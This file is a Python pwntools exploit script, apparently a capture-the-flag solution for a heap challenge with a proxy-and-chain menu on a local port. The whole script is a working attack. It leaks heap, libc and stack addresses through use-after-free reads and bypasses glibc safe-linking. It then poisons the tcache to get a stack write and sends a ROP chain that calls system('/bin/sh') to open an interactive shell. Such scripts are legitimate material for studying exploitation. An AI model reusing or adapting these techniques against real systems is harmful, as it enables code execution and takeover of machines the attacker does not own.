#!/usr/bin/env python3

from typing import List

import pwn


def add_proxy(io: pwn.tube, hostname: bytes, port: int) -> int:
    io.sendlineafter(b'> ', b'1')

    io.sendlineafter(b': ', hostname)
    io.sendlineafter(b': ', str(port).encode())

    response = io.recvline().strip().decode()
    idx = int(response.split(' ')[4][1:])

    return idx


def delete_proxy(io: pwn.tube, idx: int) -> None:
    io.sendlineafter(b'> ', b'2')

    io.sendlineafter(b': ', str(idx).encode())

    return


def add_chain(io: pwn.tube, proxies: List[int]) -> int:
    io.sendlineafter(b'> ', b'3')

    io.sendlineafter(b': ', str(len(proxies)).encode())

    for proxy in proxies:
        io.sendlineafter(b': ', str(proxy).encode())

    response = io.recvline().strip().decode()
    idx = int(response.split(' ')[4][1:])

    return idx


def view_chain(io: pwn.tube, idx: int) -> None:
    io.sendlineafter(b'> ', b'4')

    io.sendlineafter(b': ', str(idx).encode())

    return


def delete_chain(io: pwn.tube, idx: int) -> None:
    io.sendlineafter(b'> ', b'5')

    io.sendlineafter(b': ', str(idx).encode())

    return


def exit(io: pwn.tube) -> None:
    io.sendlineafter(b'> ', b'6')

    return


def encrypt_pointer(ptr: int, heap_base: int) -> int:
    return ptr ^ (heap_base >> 12)


def decrypt_pointer(ptr: int) -> int:
    parts = []

    parts.append((ptr >> 36) << 36)
    parts.append((((ptr >> 24) & 0xFFF) ^ (parts[0] >> 36)) << 24)
    parts.append((((ptr >> 12) & 0xFFF) ^ ((parts[1] >> 24) & 0xFFF)) << 12)

    return parts[0] | parts[1] | parts[2]


def add_many_proxies(io: pwn.tube, count: int) -> List[int]:
    proxies = []

    for i in range(count):
        proxy = add_proxy(io, f'proxy_{i}'.encode(), 0x1234)
        proxies.append(proxy)

    return proxies


def delete_many_proxies(io: pwn.tube, proxies: List[int]) -> None:
    for proxy in proxies:
        delete_proxy(io, proxy)

    return


def read_leaked_value(io: pwn.tube, chain_id: int) -> int:
    view_chain(io, chain_id)

    leak = io.recvline()[:-1]
    leak = leak.split(b' is ')[1].rsplit(b':', 1)[0]
    leak = pwn.u64(leak + b'\x00\x00')

    return leak


def main(io: pwn.tube) -> None:
    # step 1. leak heap address

    proxy1 = add_proxy(io, b'1111', 0x1111)
    proxy2 = add_proxy(io, b'2222', 0x2222)

    chain1 = add_chain(io, [proxy1])
    chain2 = add_chain(io, [proxy1])

    proxies1 = add_many_proxies(io, 7)

    delete_many_proxies(io, proxies1)
    delete_proxy(io, proxy1)
    proxies2 = add_many_proxies(io, 7)

    chain3 = add_chain(io, [proxy2])

    heap_base = read_leaked_value(io, chain1) - 0x370
    print(f'heap_base @ 0x{heap_base:x}')

    # step 2. prepare arbitrary read primitive

    delete_many_proxies(io, proxies2)
    delete_chain(io, chain3)
    proxies3 = add_many_proxies(io, 7)

    chain4 = add_chain(io, [proxy2])
    chain5 = add_chain(io, [proxy2])

    delete_chain(io, chain2)

    chain6 = add_chain(io, [proxy2])
    chain7 = add_chain(io, [proxy2])

    # step 3. leak libc address

    unsorted_libc_ptr = heap_base + 0x2c0

    fake_proxy = [
        pwn.p64(unsorted_libc_ptr), pwn.p64(0xFFFF),
    ]
    proxy3 = add_proxy(io, b''.join(fake_proxy), 0x00)

    proxy4 = add_proxy(io, b'AAAAAAAA', 0x4141)
    proxy5 = add_proxy(io, b'BBBBBBBB', 0x4242)

    delete_many_proxies(io, proxies3)
    delete_proxy(io, proxy4)

    libc_base = read_leaked_value(io, chain5) - 0x203b20
    print(f'libc_base @ 0x{libc_base:x}')

    # step 4. leak stack pointer

    environ_ptr = libc_base + 0x20ad58

    delete_proxy(io, proxy3)
    proxies4 = add_many_proxies(io, 7)

    fake_proxy = [
        pwn.p64(environ_ptr), pwn.p64(0xFFFF),
    ]
    proxy6 = add_proxy(io, b''.join(fake_proxy), 0x00)

    environ = read_leaked_value(io, chain5)
    print(f'environ @ 0x{environ:x}')

    # step 5. free fake tcache chunk

    # stack frame of add_proxy function
    target_ptr = environ - 0x148
    target_ptr = encrypt_pointer(target_ptr, heap_base)

    delete_many_proxies(io, proxies4)

    delete_proxy(io, proxy6)
    proxies5 = add_many_proxies(io, 7)

    fake_chunk_ptr = heap_base + 0x390

    payload = [
        # fake proxy
        pwn.p64(fake_chunk_ptr), pwn.p64(0xFFFF),

        # fake chunk
        pwn.p64(0), pwn.p64(0x90),
        pwn.p64(target_ptr), pwn.p64(0x13371337),
    ]

    proxy7 = add_proxy(io, b''.join(payload), 0x00)

    delete_chain(io, chain5)
    
    proxy8 = add_proxy(io, b''.join(payload), 0x00)

    # step 6. write rop chain and pop shell

    proxy9 = add_proxy(io, b'zzzzzzzz', 0xBEBA)

    rop_chain = [
        # saved rbp
        b'A' * 8,

        # 0x000000000010f75b : pop rdi ; ret
        pwn.p64(libc_base + 0x000000000010f75b),
        # "/bin/sh\x00"
        pwn.p64(libc_base + 0x1cb42f),
        # 0x000000000002882f : ret
        pwn.p64(libc_base + 0x000000000002882f),
        # system()
        pwn.p64(libc_base + 0x58740),
    ]

    proxy10 = add_proxy(io, b''.join(rop_chain), 0xABCD)

    io.interactive()

    return


if __name__ == '__main__':
    io = pwn.connect('127.0.0.1', 17173)

    try:
        main(io)
    except Exception as e:
        print(e)
    finally:
        io.close()
